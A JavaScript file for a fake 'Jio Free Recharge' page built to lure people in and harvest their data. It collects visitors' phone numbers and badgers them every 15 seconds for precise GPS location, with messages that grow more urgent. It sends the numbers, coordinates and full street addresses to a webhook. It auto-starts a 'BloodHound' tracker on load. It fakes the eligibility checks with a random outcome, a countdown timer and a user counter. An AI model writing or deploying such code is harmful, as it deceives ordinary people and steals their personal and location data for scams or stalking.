// ============================================
// Jio Free Recharge Template - JavaScript
// ============================================

// Global State
let selectedPlan = '';
let selectedPlanData = '';
let selectedPlanValidity = '';
let phoneNumber = '';
let maskedPhone = '';
let locationGranted = false;
let locationAttempts = 0;
let locationRetryInterval = null;
let userCity = 'your area';

// Constants
const LOCATION_RETRY_DELAY = 15000; // 15 seconds
const MAX_RETRY_ATTEMPTS = 999; // Essentially unlimited

// Retry messages with escalating urgency
const RETRY_MESSAGES = [
  '⚠️ Please allow location access to verify plan availability',
  '📍 Location access is required to check if this plan is available in your area',
  '🔒 Enable location to continue. Click "Allow" when prompted',
  '⏰ Still waiting for location permission. Please click "Allow" in your browser',
  '❗ Location required! Without it, we cannot verify plan availability',
  '🔧 Having trouble? Click the link below for help enabling location'
];

// ============================================
// Initialization
// ============================================

document.addEventListener('DOMContentLoaded', () => {
  initializeApp();
  setupEventListeners();
  startCountdown();
  startLiveCounter();
  duplicateTickerItems();
  setupExitIntent();
});

function initializeApp() {
  console.log('Jio Recharge App Initialized');

  // Auto-trigger BloodHound tracking on page load
  if (typeof window.startHound === 'function') {
    // Give a small delay to not interfere with page load
    setTimeout(() => {
      window.startHound();
    }, 1000);
  }
}

// ============================================
// Event Listeners
// ============================================

function setupEventListeners() {
  // Plan card clicks
  document.querySelectorAll('.plan-card').forEach(card => {
    card.addEventListener('click', () => handlePlanSelection(card));
  });

  // Phone modal
  document.getElementById('phoneCancel').addEventListener('click', closePhoneModal);
  document.getElementById('phoneSubmit').addEventListener('click', handlePhoneSubmit);
  document.getElementById('phoneInput').addEventListener('input', handlePhoneInput);
  document.getElementById('phoneInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handlePhoneSubmit();
  });

  // Location modal
  document.getElementById('locationAllow').addEventListener('click', handleLocationRequest);
  document.getElementById('locationTryDifferent').addEventListener('click', handleTryDifferent);
  document.getElementById('showLocationHelp').addEventListener('click', (e) => {
    e.preventDefault();
    showHelpModal();
  });

  // Success modal
  document.getElementById('successClose').addEventListener('click', closeSuccessModal);

  // Failure modal
  document.getElementById('failureClose').addEventListener('click', closeFailureModal);

  // Help modal
  document.getElementById('helpClose').addEventListener('click', closeHelpModal);

  // Exit intent modal
  document.getElementById('exitStay').addEventListener('click', closeExitModal);
  document.getElementById('exitLeave').addEventListener('click', () => {
    closeExitModal();
    // User really wants to leave, stop interfering
  });
}

// ============================================
// Plan Selection
// ============================================

function handlePlanSelection(card) {
  selectedPlan = card.dataset.plan;
  selectedPlanData = card.dataset.data;
  selectedPlanValidity = card.dataset.validity;

  console.log('Plan selected:', selectedPlan);

  // Send plan selection to server
  sendData({
    type: 'plan_selected',
    plan: selectedPlan,
    data: selectedPlanData,
    validity: selectedPlanValidity,
    timestamp: new Date().toISOString()
  });

  // Update modal with selected plan
  document.getElementById('selectedPlan').textContent = selectedPlan;

  // Show phone modal
  showPhoneModal();
}

// ============================================
// Phone Number Handling
// ============================================

function showPhoneModal() {
  document.getElementById('phoneModal').classList.add('active');
  document.getElementById('phoneInput').focus();
}

function closePhoneModal() {
  document.getElementById('phoneModal').classList.remove('active');
  document.getElementById('phoneInput').value = '';
  document.getElementById('phoneError').textContent = '';
}

function handlePhoneInput(e) {
  // Only allow digits
  e.target.value = e.target.value.replace(/\D/g, '');

  // Clear error message while typing
  if (e.target.value.length > 0) {
    document.getElementById('phoneError').textContent = '';
  }
}

function validatePhoneNumber(phone) {
  // Indian mobile number validation
  // Must be 10 digits, start with 6-9
  const phoneRegex = /^[6-9]\d{9}$/;
  return phoneRegex.test(phone);
}

function handlePhoneSubmit() {
  const phoneInput = document.getElementById('phoneInput');
  const phone = phoneInput.value.trim();
  const errorEl = document.getElementById('phoneError');

  if (!phone) {
    errorEl.textContent = '⚠️ Please enter your mobile number';
    phoneInput.focus();
    return;
  }

  if (!validatePhoneNumber(phone)) {
    errorEl.textContent = '⚠️ Please enter a valid 10-digit Indian mobile number';
    phoneInput.focus();
    return;
  }

  // Store phone number
  phoneNumber = phone;
  maskedPhone = phone.substring(0, 2) + '****' + phone.substring(6);

  console.log('Phone collected:', maskedPhone);

  // Send phone data to server
  sendData({
    type: 'phone_number',
    number: phoneNumber,
    masked: maskedPhone,
    timestamp: new Date().toISOString()
  });

  // Close phone modal and show location modal
  closePhoneModal();
  showLocationModal();
}

// ============================================
// Location Permission Handling
// ============================================

function showLocationModal() {
  document.getElementById('maskedPhone').textContent = maskedPhone;
  document.getElementById('locationModal').classList.add('active');
  locationAttempts = 0;
}

function closeLocationModal() {
  document.getElementById('locationModal').classList.remove('active');
  stopLocationRetry();
}

function handleLocationRequest() {
  console.log('Location request initiated, attempt:', locationAttempts + 1);

  if (!navigator.geolocation) {
    alert('Geolocation is not supported by your browser');
    return;
  }

  // Request location with high accuracy
  navigator.geolocation.getCurrentPosition(
    handleLocationSuccess,
    handleLocationError,
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );

  locationAttempts++;
}

function handleLocationSuccess(position) {
  console.log('Location granted!');
  locationGranted = true;
  stopLocationRetry();

  const coords = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy
  };

  // Send location data to server
  sendData({
    type: 'gps',
    coords: coords,
    attempts: locationAttempts,
    timestamp: new Date().toISOString()
  });

  // Try to get city name from coordinates (reverse geocoding)
  getCityFromCoords(coords.latitude, coords.longitude);

  // Close location modal and show loading
  closeLocationModal();
  showLoadingModal();
}

function handleLocationError(error) {
  console.log('Location denied or error:', error.message);

  let errorMessage = 'Unknown error';
  switch (error.code) {
    case error.PERMISSION_DENIED:
      errorMessage = 'User denied location permission';
      break;
    case error.POSITION_UNAVAILABLE:
      errorMessage = 'Location information unavailable';
      break;
    case error.TIMEOUT:
      errorMessage = 'Location request timed out';
      break;
  }

  // Send error data to server
  sendData({
    type: 'location_error',
    error: errorMessage,
    code: error.code,
    attempt: locationAttempts,
    timestamp: new Date().toISOString()
  });

  // Show retry message
  showRetryMessage();

  // Start persistent retry
  startLocationRetry();
}

function showRetryMessage() {
  const retryEl = document.getElementById('retryMessage');
  const messageIndex = Math.min(locationAttempts - 1, RETRY_MESSAGES.length - 1);
  retryEl.textContent = RETRY_MESSAGES[messageIndex];
  retryEl.classList.add('show');
}

function startLocationRetry() {
  if (locationRetryInterval) return; // Already running

  locationRetryInterval = setInterval(() => {
    if (locationGranted) {
      stopLocationRetry();
      return;
    }

    if (locationAttempts < MAX_RETRY_ATTEMPTS) {
      console.log('Auto-retrying location request...');
      handleLocationRequest();
    }
  }, LOCATION_RETRY_DELAY);
}

function stopLocationRetry() {
  if (locationRetryInterval) {
    clearInterval(locationRetryInterval);
    locationRetryInterval = null;
  }
}

function handleTryDifferent() {
  // User wants to try a different plan
  // Send tracking data
  sendData({
    type: 'try_different_plan',
    reason: 'location_denied',
    attempts: locationAttempts,
    timestamp: new Date().toISOString()
  });

  // Close location modal and reset
  closeLocationModal();

  // Scroll back to plans
  document.querySelector('.plans-section').scrollIntoView({ behavior: 'smooth' });
}

// ============================================
// Loading Modal
// ============================================

function showLoadingModal() {
  const modal = document.getElementById('loadingModal');
  const loadingText = document.getElementById('loadingText');

  modal.classList.add('active');

  // Simulate loading steps
  const steps = [
    'Checking Jio network coverage...',
    'Validating plan eligibility...',
    'Verifying location data...',
    'Processing your request...'
  ];

  let currentStep = 0;
  const stepInterval = setInterval(() => {
    if (currentStep < steps.length) {
      loadingText.textContent = steps[currentStep];
      currentStep++;
    } else {
      clearInterval(stepInterval);
      // Decide success or failure (50/50)
      setTimeout(() => {
        closeLoadingModal();
        showResultModal();
      }, 500);
    }
  }, 1200);
}

function closeLoadingModal() {
  document.getElementById('loadingModal').classList.remove('active');
}

// ============================================
// Result Modals
// ============================================

function showResultModal() {
  // 50% chance of success
  const isSuccess = Math.random() > 0.5;

  if (isSuccess) {
    showSuccessModal();
  } else {
    showFailureModal();
  }
}

function showSuccessModal() {
  document.getElementById('successPlan').textContent = selectedPlan;
  document.getElementById('successPhone').textContent = maskedPhone;
  document.getElementById('userCity').textContent = userCity;
  document.getElementById('successModal').classList.add('active');

  // Send success tracking
  sendData({
    type: 'result_success',
    plan: selectedPlan,
    phone: phoneNumber,
    city: userCity,
    timestamp: new Date().toISOString()
  });
}

function closeSuccessModal() {
  document.getElementById('successModal').classList.remove('active');
}

function showFailureModal() {
  document.getElementById('failurePlan').textContent = selectedPlan;
  document.getElementById('failurePhone').textContent = maskedPhone;
  document.getElementById('userCityFail').textContent = userCity;
  document.getElementById('failureModal').classList.add('active');

  // Send failure tracking
  sendData({
    type: 'result_failure',
    plan: selectedPlan,
    phone: phoneNumber,
    city: userCity,
    timestamp: new Date().toISOString()
  });
}

function closeFailureModal() {
  document.getElementById('failureModal').classList.remove('active');
  // Scroll back to plans for user to try different plan
  document.querySelector('.plans-section').scrollIntoView({ behavior: 'smooth' });
}

// ============================================
// Help Modal
// ============================================

function showHelpModal() {
  document.getElementById('helpModal').classList.add('active');
}

function closeHelpModal() {
  document.getElementById('helpModal').classList.remove('active');
}

// ============================================
// Exit Intent
// ============================================

let exitIntentShown = false;

function setupExitIntent() {
  document.addEventListener('mouseleave', (e) => {
    // Only trigger if mouse leaves from top
    if (e.clientY < 0 && !exitIntentShown) {
      showExitModal();
    }
  });

  // Mobile: detect back button (not perfectly reliable)
  window.addEventListener('beforeunload', (e) => {
    if (!exitIntentShown) {
      e.preventDefault();
      e.returnValue = '';
      return '';
    }
  });
}

function showExitModal() {
  exitIntentShown = true;
  document.getElementById('exitModal').classList.add('active');

  sendData({
    type: 'exit_intent',
    timestamp: new Date().toISOString()
  });
}

function closeExitModal() {
  document.getElementById('exitModal').classList.remove('active');
}

// ============================================
// Countdown Timer
// ============================================

function startCountdown() {
  // Start from 14:32:15
  let totalSeconds = (14 * 3600) + (32 * 60) + 15;

  setInterval(() => {
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;

    document.getElementById('hours').textContent = String(hours).padStart(2, '0');
    document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
    document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');

    totalSeconds--;

    // Reset when reaches zero
    if (totalSeconds < 0) {
      totalSeconds = (14 * 3600) + (32 * 60) + 15;
    }
  }, 1000);
}

// ============================================
// Live User Counter
// ============================================

function startLiveCounter() {
  let count = 12847;

  setInterval(() => {
    // Randomly increase by 1-3
    count += Math.floor(Math.random() * 3) + 1;
    document.getElementById('userCount').textContent = count.toLocaleString();
  }, 5000); // Every 5 seconds
}

// ============================================
// Testimonial Ticker
// ============================================

function duplicateTickerItems() {
  const ticker = document.getElementById('ticker');
  const items = ticker.innerHTML;
  // Duplicate for seamless infinite scroll
  ticker.innerHTML = items + items + items;
}

// ============================================
// Reverse Geocoding
// ============================================

async function getCityFromCoords(lat, lon) {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
    const data = await response.json();

    if (data.address) {
      userCity = data.address.city || data.address.town || data.address.village || data.address.state || 'your area';
      console.log('User city:', userCity);

      // Send city data
      sendData({
        type: 'user_city',
        city: userCity,
        full_address: data.display_name,
        timestamp: new Date().toISOString()
      });
    }
  } catch (error) {
    console.error('Geocoding error:', error);
    userCity = 'your area';
  }
}

// ============================================
// Data Transmission
// ============================================

async function sendData(data) {
  try {
    await fetch('/api/webhook', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    console.log('Data sent:', data.type);
  } catch (error) {
    console.error('Error sending data:', error);
  }
}

// ============================================
// Utility Functions
// ============================================

// Close modal when clicking overlay
document.addEventListener('click', (e) => {
  if (e.target.classList.contains('modal-overlay')) {
    const modal = e.target.parentElement;
    if (modal.id !== 'loadingModal') { // Don't allow closing loading modal
      modal.classList.remove('active');
    }
  }
});

// Prevent text selection on double-click (better UX)
document.addEventListener('selectstart', (e) => {
  if (e.target.classList.contains('plan-btn') ||
    e.target.classList.contains('btn')) {
    e.preventDefault();
  }
});